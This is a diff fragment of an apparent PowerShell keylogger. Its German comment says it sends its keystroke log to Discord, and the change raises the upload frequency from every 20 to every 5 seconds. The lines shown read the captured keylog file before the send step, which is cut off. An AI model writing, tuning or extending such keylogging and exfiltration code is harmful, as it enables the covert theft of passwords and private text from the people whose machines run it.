@@ -36,7 +36,7 @@ while ($true) {
         }
     }
     # 2. Alle 20 Sekunden Log an Discord schicken
-    if ((Get-Date).Second % 20 -eq 0) {
+    if ((Get-Date).Second % 5 -eq 0) {
         if (Test-Path $logFile) {
             $keylog = Get-Content $logFile -Raw
             if ($keylog.Trim().Length -gt 0) {
